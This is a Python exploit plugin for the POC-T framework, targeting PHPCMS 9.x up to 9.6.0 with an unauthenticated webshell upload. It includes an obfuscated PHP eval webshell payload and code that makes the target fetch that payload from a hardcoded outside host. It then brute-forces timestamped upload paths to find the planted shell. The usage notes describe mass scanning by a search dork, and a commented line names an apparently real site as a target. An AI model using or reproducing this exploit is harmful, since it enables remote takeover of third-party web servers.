#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
PHPCMS Unauthenticated Webshell Upload Exploit

Version:
  9.x <= 9.6.0

Usage:
  1. Upload `payload.txt` on your own public webserver.

    ```payload.txt
    <?php $xy = "eval"; $xy .= "(";$xy .= "$";$xy .= "_PO";$xy .= "ST['password']);";@eval($xy);?>
    ```

  2. Change `PUBLIC_URL` to your own path like `http://your_host/payload.txt`.
  3. python POC-T.py -s phpcms9.6.0-getshell -aG "Powered by PHPCMS v9" --limit 100

Reference:
  https://www.t00ls.net/viewthread.php?tid=39226&extra=&page=1

"""

import requests
from datetime import datetime
from plugin.util import randomString

PUBLIC_URL = 'http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt'
TIMEOUT = 10

def getTime():
    year = str(datetime.now().year)
    month = "%02d" % datetime.now().month
    day = "%02d" % datetime.now().day
    hour = datetime.now().hour
    hour = hour - 12 if hour > 12 else hour
    hour = "%02d" % hour
    minute = "%02d" % datetime.now().minute
    second = "%02d" % datetime.now().second
    microsecond = "%06d" % datetime.now().microsecond
    microsecond = microsecond[:3]
    nowTime = year + month + day + hour + minute + second + microsecond
    return int(nowTime), year + "/" + month + day + "/"

def poc(url):
    url = url if '://' in url else 'http://' + url
    url = url.split('#')[0].split('?')[0].rstrip('/').rstrip('/index.php')
    data = {
        "siteid": "1",
        "modelid": "1",
        "username": randomString(10),
        "password": randomString(10),
        "email": "{}@qq.com".format(randomString(10)),
        "info[content]": "<img src={}?.php#.jpg>".format(PUBLIC_URL),
        "dosubmit": "1",
        "protocol": "",
    }

    target_url = url + "/index.php?m=member&c=index&a=register&siteid=1"
    print target_url
    try:
        startTime, _ = getTime()
        r = requests.post(target_url, data=data, timeout=TIMEOUT)
        finishTime, dateUrl = getTime()
        if "MySQL Error" in r.content and "http" in r.content:
            successUrl = r.text[r.text.index("http"):r.text.index(".php")] + ".php"
            return successUrl
        else:
            successUrl = ""
            for t in range(startTime, finishTime):
                #print url + "/uploadfile/" + dateUrl + str(t) + ".php"
                checkUrlHtml = requests.get(
                    url + "/uploadfile/" + dateUrl + str(t) + ".php")
                if checkUrlHtml.status_code == 200:
                    successUrl = url + "/uploadfile/" + \
                        dateUrl + str(t) + ".php"
                    return successUrl
    except Exception, e:
        print e
        return False

    return False
    
#print poc("http://english.shenmojiaoyu.com")
